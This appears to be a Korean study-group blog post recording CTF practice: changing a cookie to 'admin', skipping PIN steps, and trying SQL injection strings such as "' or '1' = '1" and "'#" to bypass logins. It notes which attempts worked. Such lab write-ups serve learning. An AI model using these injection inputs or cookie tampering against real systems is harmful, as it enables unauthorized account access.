---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[CTF] CTF 풀이: Cookie, SQL Injection"
excerpt: "모의해킹 취업반 스터디 7기 5주차"

date: 2024-11-18
last_modified_at: 

tags: [TIL, WEB, DATABASE, CTF]
---

# get admin
<img src = "https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-18-1.png?raw=true">
쿠키값을 admin으로 바꾸면 clear

# pin code bypass
<img src = "https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-18-2.png?raw=true">
<img src = "https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-18-3.png?raw=true">
step1 -> step2 -> step3일거라 예상
step3로 값 주면 clear

# Admin is Mine
1. 
id: doldol
pw: dol1234
2. 
id: doldol(')#
pw: dol1234
-> 실행X -> python인가? php도 #으로 주석처리가 되는구나??
3. 
id: doldol(')//
pw: dol1234
-> X, 얘는 왜 실행은 되는거냐?
4. 
id: doldol'--
pw: dol1234
-> X
5. 
doldol' join select * from member where userID like 'a%
dol1234
-> X

# Pin Code Crack

# Login Bypass 1
1. 
id: doldol
pw: dol1234
2. 
doldol' or '1' = '1
dol1234
3. 
normaltic' or '1' = '1
asdf
-> O

# login bypass 2
login bypass 1에서 로그인한 상태로 접속하면 로그인 상태로 접속되길래 normaltic2로 시도해봄.
-> login bypass끼리 sql 공유하는 듯
<img src = "https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-11-18-4.png?raw=true">
플래그는 안 보임 ㄲㅂ

1. 
id: doldol
pw: dol1234
2. 
id: doldol'or
pw: dol1234
3. 
id: doldol'or
pw: dol1234'or
4. 
id: doldol' or
pw: dol1234' or
-> X
5. 
id: normaltic2'#
pw: asdf
-> O